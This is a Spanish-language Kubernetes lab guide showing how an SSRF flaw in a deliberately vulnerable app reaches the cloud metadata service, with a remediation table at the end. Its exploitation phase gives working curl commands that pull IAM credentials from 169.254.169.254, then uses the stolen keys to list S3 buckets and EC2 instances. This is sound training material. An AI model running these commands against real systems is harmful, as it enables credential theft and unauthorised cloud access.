# Lab 1: SSRF & Acceso a Cloud Metadata

## Objetivo

Demostrar cómo una vulnerabilidad SSRF (Server-Side Request Forgery) en una aplicación web permite a un atacante acceder al Instance Metadata Service (IMDS) en `169.254.169.254` y robar credenciales IAM del nodo cloud.

## 🔴 Caso Real: Capital One (2019)

En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un WAF mal configurado de Capital One para acceder al IMDS de AWS. Robó credenciales IAM temporales que le permitieron acceder a más de **100 millones de registros** de clientes almacenados en S3. La multa fue de **$80 millones de dólares**. El vector exacto: SSRF → `169.254.169.254` → IAM credentials → S3 buckets.

---

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `vulnerable.yaml` | App Python con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable.yaml
kubectl get pods -n lab1-ssrf -w
# Esperar a que esté Running
```

## Fase 2: Explotación SSRF

### Paso 1: Acceder a la app

```bash
# Obtener la IP interna del nodo
kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}'
# Ejemplo de salida: 192.168.49.2

# Guardar en una variable para los siguientes pasos
export NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo "Node IP: $NODE_IP"

# Verificar el NodePort asignado al servicio
kubectl get svc ssrf-app-svc -n lab1-ssrf
# El NodePort es 31082

# Acceder a la app via navegador o curl
curl "http://$NODE_IP:31082"
```

> **Alternativa con port-forward** (si el NodePort no es accesible):
> ```bash
> kubectl port-forward svc/ssrf-app-svc 8080:8080 -n lab1-ssrf &
> # Luego acceder a http://localhost:8080
> ```

### Paso 2: Probar SSRF al IMDS (AWS)

```bash
# Desde el navegador o curl:

# Listar metadata disponible
curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/"

# Obtener el IAM role del nodo
curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Robar credenciales temporales
curl "http://$NODE_IP:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
# → AccessKeyId, SecretAccessKey, Token
```

### Paso 3: Usar credenciales robadas (si estás en AWS real)

```bash
export AWS_ACCESS_KEY_ID="<robado>"
export AWS_SECRET_ACCESS_KEY="<robado>"
export AWS_SESSION_TOKEN="<robado>"

# Listar buckets S3
aws s3 ls

# Describir instancias EC2
aws ec2 describe-instances

# → CONTROL sobre recursos cloud del nodo
```

> **Nota**: En un cluster local, `169.254.169.254` no responde. El lab demuestra el flujo de SSRF. En un EKS/GKE/AKS real, sí retorna credenciales.

## Remediación Recomendada

| Capa | Defensa | Cómo Funciona |
|------|---------|---------------|
| **Red** | NetworkPolicy egress | Bloquea tráfico a `169.254.169.254/32` desde Pods |
| **App** | Validación de URLs | Resuelve DNS, verifica IP contra rangos bloqueados |
| **Cloud** | IMDSv2 (AWS) | Requiere token PUT previo — SSRF simple no funciona |
| **Identity** | Workload Identity | Elimina la necesidad de IMDS por completo |
| **WAF** | Reglas anti-SSRF | Detecta patrones de SSRF en URLs de input |

---

## Cleanup

```bash
kubectl delete namespace lab1-ssrf
```
